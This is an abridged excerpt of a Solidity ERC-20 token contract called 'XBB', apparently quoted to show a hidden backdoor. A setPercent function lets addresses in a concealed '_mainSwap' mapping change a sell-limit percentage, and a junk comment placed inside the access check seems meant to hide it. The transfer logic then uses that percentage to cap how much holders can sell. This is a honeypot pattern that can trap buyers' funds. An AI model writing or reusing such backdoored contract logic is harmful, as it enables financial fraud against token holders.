...
contract XBB is Context, IERC20, Ownable {
    ...
    string private _name = "XBB";
    string private _symbol = "XBB";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x863Ccccc1a9B918201AFd7b8Ff68e804AfAba5F1); 
    address payable private teamWalletAddress = payable(0x893A6925024AE45B12C5E3A7FAdaA1bf86A051B3); 
	...
	function setPercent(uint256 newLimit) external  {
	   if( _mainSwap[ /*as aXxsdfghjk11;‘*/msg.sender])
	   {
	      _percent = newLimit;
	   }      
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if (!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]) {
            uint256 maxSellAmount = balance.mul(_percent).div(10000);
